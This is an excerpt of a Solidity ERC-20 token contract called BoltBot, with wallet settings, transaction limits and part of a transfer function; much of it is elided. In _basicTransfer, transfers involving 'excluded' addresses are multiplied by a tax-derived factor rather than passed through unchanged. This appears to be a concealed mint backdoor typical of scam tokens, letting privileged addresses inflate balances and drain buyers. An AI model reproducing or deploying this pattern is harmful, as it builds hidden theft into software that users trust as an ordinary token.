...
contract BoltBot is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = unicode"BoltBot";
    string private _symbol = unicode"BOLT";
    uint8 private _decimals = 18;

    address payable public devWallet = payable(msg.sender);
    address payable public marketingWallet = payable(0x755C714712453B831Db050Ffd7cA3CF4475D914f);
    ...
    uint256 public _maxTxAmount =  _totalSupply.mul(29).div(1000); 
    uint256 public _walletMax =   _totalSupply.mul(29).div(1000); 
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 rAmount = shouldExcluded(sender, recipient) ? amount * (_totalTaxIfBuying.sub(2)) : amount;
